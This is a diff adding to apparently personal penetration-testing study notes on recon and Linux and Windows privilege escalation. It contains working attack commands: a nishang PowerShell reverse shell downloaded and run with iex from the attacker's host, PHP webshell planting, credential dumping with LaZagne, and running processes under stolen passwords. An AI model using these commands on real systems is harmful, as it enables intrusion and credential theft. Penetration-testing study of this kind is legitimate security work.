@@ -8,7 +8,7 @@ Sidenote: FTP are often unstable so if ftp / ftp files fails/corrupted go revert
 
 ## 1. Run begin.sh (basically autorecon)
 <details>
-While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Do <a href="./general/Connecting">anonymous login</a> for any main services identified also.
+While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Look out for non-standard tags like `<wp-includes>` and search them up. Do <a href="./general/Connecting">anonymous login</a> for any main services identified also.
 
 If AD detected:
 <details>
@@ -64,13 +64,85 @@ Look thru full nmap scan for any definitive versions and add that to software/ve
 # PrivEsc
 
 ## Linux
+<details>
+`su <user>` to lateral move to another user if u know pw
 
+### 1. LinPEAS
+Try to [upload](/docs/general/Download%20&%20Upload) LinPEAS and run it. If you can, follow the steps [here](/docs/procedure/LinPEAS)
+
+### 2. pspy
+[Upload](/docs/general/Download%20&%20Upload) pspy64 then run `./pspy64`
+
+3. look out for “Analyzing Wordpress Files (limit 70)"
+</details>
+
+## Windows
+<details>
+if 32-bit (x86), use https://www.exploit-db.com/exploits/40564
+
+if you only have modify perms, `move orig_file orig_file.bak` then u can download ur malicious file
+
+if u are in the system and there is an apache user, u can try to copy php webshells directly into C:\xampp\htdocs and access it on the website via `/<filename>` and then run a reverse shell from that webshell, allowing u to access the apache user
+
+### No curl and iwr
+<details>
+if u can run powershell commands on cmd (test using `powershell whoami`) u can:
+
+#### Upgrade your shell
+<details>
+`cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1` , copy one of the commands in the top of the file (eg `Invoke-PowerShellTcp -Reverse -IPAddress <kali ip> -Port <port>`) and paste it at the bottom. **Remember not to copy the “PS >” part!!** 
+
+Then save the file and `python3 -m http.server 8000` and then `iex (New-Object Net.WebClient).DownloadString("http://<kali ip>:<port>/nishang.ps1")`
+</details>
+
+You can also run any ps1 file using IEX (see the upgrade shell dropdown above for the command). u can run like winpeas.ps1 or jaws-enum.ps1
+</details>
+
+### Run as other user
+If you have the user + plaintext password of another user
+<details>
+```powershell
+$secPassword = ConvertTo-SecureString '<pw>' -AsPlainText -Force
+$myCreds = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $secPassword)
+Start-Process -FilePath "cmd.exe" -Credential $myCreds -NoNewWindow
+```
+if wrong pw u'll see this
+```powershell
+PS C:\xampp\htdocs> Start-Process -FilePath "cmd.exe" -Credential $myCreds
+Start-Process -FilePath "cmd.exe" -Credential $myCreds
+Start-Process : This command cannot be run due to the error: The user name or password is incorrect.
+At line:1 char:1
++ Start-Process -FilePath "cmd.exe" -Credential $myCreds
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException
+    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand
+```
+</details>
+
+### 1. WinPEAS
+Try to [upload](/docs/general/Download%20&%20Upload) WinPEAS and run it. If you can, follow the steps [here](/docs/procedure/WinPEAS)
+
+
+### 2. LaZagne
+<details>
+[Upload](/docs/general/Download%20&%20Upload) LaZagne to victim then `./LaZagne.exe all`
+</details>
+
+</details>
 
 If found:
 
+- Weird files that you can't open: run `strings <file>` and verify that it is unencrypted (u can make out full strings of english or whatnot), if it is make a wordlist: `strings -n 8 backup.mdb | sort -u > <filename>.txt`, then run it against whatever stuff needs like a pw for it. [WIP, im gonna need a pipeline if im going to make a wordlist for every unopenable weird file that I find]
 - NTLM hash: refer to [NTLM](/docs/procedure/NTLM)
 - [AD](/docs/general/AD#enumeration)
 - cpassword hash: `gpp-decrypt.py <hash>`
+- [phpinfo](/docs/procedure/phpinfo)
+- [File Upload](/docs/procedure/File%20Upload)
+- [Wordpress](/docs/procedure/Wordpress)
+- [SQL & PHP](/docs/general/Reverse%20Shell#sql--php-reverse-shell)
+- [Password protected files](/docs/procedure/Password%20protected%20files)
+- .pst: `readpst <file>` then just open the resulting mdap file, should be readable in vscode
+- [.mdb, MongoDB](/docs/procedure/MongoDB)
 
 Errors:
 
